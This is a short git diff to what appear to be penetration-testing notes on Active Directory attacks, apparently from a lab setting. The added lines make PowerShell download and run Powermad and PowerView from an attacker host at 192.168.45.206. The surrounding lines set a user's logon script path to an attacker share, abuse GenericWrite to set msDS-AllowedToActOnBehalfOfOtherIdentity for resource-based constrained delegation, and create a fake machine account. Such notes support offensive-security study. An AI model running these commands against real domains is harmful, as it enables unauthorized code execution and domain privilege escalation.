@@ -689,8 +689,10 @@ Set-DomainObject -Identity SHAUN.BLAKE -Set @{'scriptpath'='\\192.168.45.218\sha
 
   * Since we have GenericWrite on appsrv01, we can update any non-protected property on that object, including msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.
 
-- <pre class="language-powershell"><code class="lang-powershell"># Create a fake computer account
-  . .\powermad.ps1
+- <pre class="language-powershell"><code class="lang-powershell">iex (new-object net.webclient).downloadstring('http://192.168.45.206/Powermad.ps1')
+  iex (new-object net.webclient).downloadstring('http://192.168.45.206/PowerView.ps1')
+
+  # Create a fake computer account
   New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
   Get-DomainComputer -Identity myComputer
 
